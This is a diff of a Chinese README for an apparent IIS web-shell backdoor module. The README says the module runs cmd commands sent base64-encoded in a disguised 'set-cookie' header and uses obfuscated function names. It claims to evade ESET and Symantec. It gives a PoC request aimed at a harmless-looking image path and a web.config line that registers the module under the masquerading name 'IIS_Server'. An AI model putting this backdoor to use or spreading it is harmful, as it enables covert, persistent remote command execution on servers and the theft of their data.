@@ -1,23 +1,22 @@
+### 简介
 参考WBGlIl大佬项目，删除powershell和shellcode功能，只保留cmd功能
-
 Cookie: cmd= 改成 Cookie: set-cookie=，对函数名进行混淆
-
 目前已绕过 eset 和 symantec 
 
-PoC如下
+### PoC如下
 ```
 GET /aspnet_client/system_web/iisstart.png HTTP/2
 Host: 192.168.42.128
 Cookie: set-cookie=bmV0IHVzZXI=
 ```
-web.config 添加如下内容
+### web.config 添加如下内容
 ```
 <add name="IIS_Server" type="IIS_Server_dll.IISModule" />
 ```
 
 ![飞书20230223-125217](https://user-images.githubusercontent.com/72059221/220823929-5b47c98a-94b7-4e9d-90a7-f30d4527eab3.jpg)
 
-利用测试  
+### 实际测试  
 ![飞书20230223-115221](https://user-images.githubusercontent.com/72059221/220817771-b66c981d-df1e-46ff-8a02-ec4a62f023c5.jpg)
 
 ![飞书20230223-115225](https://user-images.githubusercontent.com/72059221/220817780-05b90dbb-fb4c-435f-92ea-a4fa5560cd82.jpg)
